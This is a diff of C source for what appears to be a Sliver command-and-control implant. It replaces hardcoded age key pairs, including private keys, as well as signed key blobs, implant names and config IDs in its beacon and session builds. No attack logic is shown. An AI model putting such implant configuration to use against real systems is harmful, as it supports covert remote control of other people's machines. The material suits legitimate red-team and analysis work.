@@ -1977,12 +1977,12 @@ VOID Final(VOID)
 #ifdef _BEACON
 	PSLIVER_BEACON_CLIENT pBeaconClient = NULL;
 	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
-	CHAR szPeerPubKey[] = "age17hl72vxxx3axgnmp0ctwsuzp5d8f526g8w094w5nwz2yyzeu7yysuc0mah";
-	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1VSCYD8QLK9WYP0M2Y6DQQ07T50VXRZ4R9NSRCSEKA6YWXYHZAMUQYTAZRJ";
+	CHAR szPeerPubKey[] = "age1z8yd2vkrxqelp82fhhsqwql5zvvjl2jzc2us03uqu9j72ve79g8s4fcp6v";
+	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-12FPRDVR7Y9J7GHHCE3R0UN0MKLC7RS3Z48NW0C9CJ3PWJU3HX6UQFLMXPN";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
 	UINT64 uEncoderNonce = 13;
-	CHAR szSliverClientName[] = "LOCAL_DINER";
-	CHAR szConfigId[] = "e7a32220-326e-422d-9215-1503b6d69ce5";
+	CHAR szSliverClientName[] = "SOFT_TUNIC";
+	CHAR szConfigId[] = "e3db8606-9375-4678-82ad-954b426e1186";
 	DWORD dwMaxFailure = 5;
 	DWORD dwReconnectInterval = 600;
 #elif _SESSION
@@ -2001,12 +2001,12 @@ VOID Final(VOID)
 	// From Phan Chu Trinh
 	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
 	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
-	CHAR szPeerPubKey[] = "age1rxdeq6u2wnyxwfan9ll7ggdss8dhhw7rkryxvfclckrpyh55kp4qajppgy";
-	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-17ENF9KR5YJ5D26DP8J2MSJGYJPPTSTSK2DNXU9HT9JDLDUEX0UAQ9A8XU4";
+	CHAR szPeerPubKey[] = "age1dr6wu66ys8xw77ntv3c5323juar0mu3pfzh3w8keu7r26szctenq9ml0y9";
+	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1WMHCENFT9V35KGJL7AC79LQ7YU595YYKYDZU4N5RXSDTVMK9KJ7SKS9GX0";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
 	UINT64 uEncoderNonce = 13;
-	CHAR szSliverClientName[] = "LUCKY_BRASSIERE";
-	CHAR szConfigId[] = "5cd83e7f-3958-491d-ae5e-fdfa2ee7800a";
+	CHAR szSliverClientName[] = "PLASTIC_DATABASE";
+	CHAR szConfigId[] = "8001d686-212d-42b6-a86f-0a9681cf2fe9";
 	DWORD dwMaxFailure = 5;
 	DWORD dwReconnectInterval = 600;
 #else
@@ -2020,13 +2020,13 @@ VOID Final(VOID)
 
 	// From Phan Chu Trinh
 	PSLIVER_SESSION_CLIENT pSessionClient = NULL;
-	CHAR szPeerPubKey[] = "age16aedv4nundhlv927c8meu8k9vrcf224sr090k7999420ps07zyas6nlr9d";
-	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-15YWPM5V3JPGXACM8UGKNYDK09405YFFFXQ7HNA6S9S2V5FMGL20Q6EXCAD";
+	CHAR szPeerPubKey[] = "age1kcgw9sshhgjl99gtdqg5crtlx9e9dgnm688j9ce98pcz6dwt73zs6jj4nm";
+	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1KJ8M0NGRMJ90W2U08LVJLLA848TKXP6QKTH30STS3NHXV5MEDJ4Q95FZUM";
 	CHAR szRecipientPubKey[] = "age15tmzalnatxxuun3x6s6x0klvyyqd5dzen252e346655yfdq8juqqaktwxl";
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
-	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+cotPaO2HUlHxdPIlJ4lDeGPTabempvacXTJTRYY/CCiTaxyFHfU9h6rZOnnGIPmpOC4O64uGYo8sm0rYf5Vcw8=\ntrusted comment: timestamp:1730078090\nl7oSil5yXvzaofhdUQ2crXv/rBhC3i7DtSmMJajaq4WletrhFq6TOj82pABO4gjoMGNIg9m3Rjq8/FJ0Cx3OBQ==";
-	CHAR szSliverClientName[] = "SLIPPERY_BALANCE";
-	CHAR szConfigId[] = "dada7b66-cad8-4d21-b038-4872f834109d";
+	CHAR szPeerAgePublicKeySignature[] = "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+R1arZLraIBUFzy0FUA0fqQpdqqvpOtaYQ4T6EQa9BWN6G096nSfuMikQayWIdxsyc0/cqy0hppjz8NPqZbl+g4=\ntrusted comment: timestamp:1730114144\nkpsqCc+x7Ag2kVnhTXSuhY4VJkI/KGV5KR6unjmlYUEEKTP9z5UZc+8Rtxir2/QqLV+gJOj6JY+xXMpb0mytDA==";
+	CHAR szSliverClientName[] = "WORRIED_ABDOMEN";
+	CHAR szConfigId[] = "018dbe78-4ee7-4ab2-a49a-fa1feb2dab74";
 #endif
 
 #ifndef _DEBUG
